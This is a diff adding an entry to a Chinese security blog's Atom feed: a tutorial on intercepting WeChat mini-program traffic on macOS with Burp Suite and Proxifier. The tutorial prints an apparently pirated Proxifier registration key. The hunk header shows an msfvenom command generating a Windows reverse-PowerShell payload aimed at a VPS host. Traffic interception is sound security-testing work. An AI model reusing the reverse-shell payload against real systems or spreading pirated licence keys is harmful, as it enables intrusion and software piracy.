@@ -139,6 +139,53 @@ msfvenom -p cmd/windows/reverse_powershell LHOST=VPS_IP LPORT=1234
         <updated>2021-12-03T08:03:54.000Z</updated>
     </entry>
     <entry>
+        <id>http://gsh3ll.top/2021/11/17/%E4%BC%98%E9%9B%85%E5%9C%B0%E5%9C%A8macOS%E4%B8%8B%E6%8A%93%E5%8F%96%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%81%E9%87%8F/</id>
+        <title>macOS下优雅地抓取小程序流量</title>
+        <link rel="alternate" href="http://gsh3ll.top/2021/11/17/%E4%BC%98%E9%9B%85%E5%9C%B0%E5%9C%A8macOS%E4%B8%8B%E6%8A%93%E5%8F%96%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%81%E9%87%8F/"/>
+        <content type="html">&lt;h1 id=&#34;macos下优雅地抓取小程序流量&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#macos下优雅地抓取小程序流量&#34;&gt;#&lt;/a&gt; macOS 下优雅地抓取小程序流量&lt;/h1&gt;
+&lt;p&gt;准备：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;
+&lt;p&gt;Burpsuite（安装 Burpsuite 证书到 macOS 系统中）&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Proxifer&lt;br /&gt;
+ 使用 &lt;code&gt;brew install --cask proxifier&lt;/code&gt;  安装&lt;/p&gt;
+&lt;pre&gt;&lt;code class=&#34;language-纯文本&#34;&gt;## 激活序列号
+Your name or company 
+name:[macwk.com](http://macwk.com)
+Your registration 
+key:2DNRX-V3PNK-TEGYN-DR01D-9UGGT
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;Wechat for Mac&lt;/p&gt;
+&lt;/li&gt;
+&lt;li&gt;
+&lt;p&gt;关掉梯子&lt;/p&gt;
+&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;原理：&lt;/p&gt;
+&lt;p&gt;通过 Proxifer 工具代理微信小程序流量到 Burp&lt;/p&gt;
+&lt;h1 id=&#34;安装证书&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#安装证书&#34;&gt;#&lt;/a&gt; 安装证书&lt;/h1&gt;
+&lt;p&gt;开启 bp，浏览器访问 127.0.0.1:8080 下载 CA 证书，打开并选择始终信任。&lt;/p&gt;
+&lt;h1 id=&#34;添加proxifer规则&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#添加proxifer规则&#34;&gt;#&lt;/a&gt; 添加 Proxifer 规则&lt;/h1&gt;
+&lt;p&gt;添加代理规则 Proxies，添加代理 填入 burpSuite 代理 ip 和端口选择 https 保存即可。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/images/%E4%BC%98%E9%9B%85%E5%9C%B0%E5%9C%A8macOS%E4%B8%8B%E6%8A%93%E5%8F%96%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%81%E9%87%8F.assets/image.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;再添加 Rules 过滤规则，为微信小程序添加一个专属的过滤规则。&lt;/p&gt;
+&lt;p&gt;&lt;img data-src=&#34;/images/%E4%BC%98%E9%9B%85%E5%9C%B0%E5%9C%A8macOS%E4%B8%8B%E6%8A%93%E5%8F%96%E5%B0%8F%E7%A8%8B%E5%BA%8F%E6%B5%81%E9%87%8F.assets/image_1.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;
+&lt;p&gt;通过 command+shift+G 可以打开访达，输入指定路径 / Applications/WeChat.app/Contents/MacOS，并打开 mac 的微信小程序。&lt;/p&gt;
+&lt;p&gt;选择微信小程序主程序 (Mini Program.app) 即可。&lt;/p&gt;
+&lt;p&gt;务必先打开 Proxifer，再打开 bup，再打开小程序，全程需要关闭梯子。&lt;/p&gt;
+&lt;h1 id=&#34;关于clash&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#关于clash&#34;&gt;#&lt;/a&gt; 关于 clash&lt;/h1&gt;
+&lt;p&gt;可以在 Proxifer 中添加 clash，设置为直连，clash 勾去设置为默认代理选项，即可访问 google。&lt;/p&gt;
+</content>
+        <category term="安全技术" scheme="http://gsh3ll.top/categories/%E5%AE%89%E5%85%A8%E6%8A%80%E6%9C%AF/" />
+        <category term="macOS" scheme="http://gsh3ll.top/tags/macOS/" />
+        <category term="小程序" scheme="http://gsh3ll.top/tags/%E5%B0%8F%E7%A8%8B%E5%BA%8F/" />
+        <updated>2021-11-17T02:37:33.000Z</updated>
+    </entry>
+    <entry>
         <id>http://gsh3ll.top/2021/07/29/MacOS%E5%B0%8F%E8%AE%B0/</id>
         <title>MacOS小记</title>
         <link rel="alternate" href="http://gsh3ll.top/2021/07/29/MacOS%E5%B0%8F%E8%AE%B0/"/>
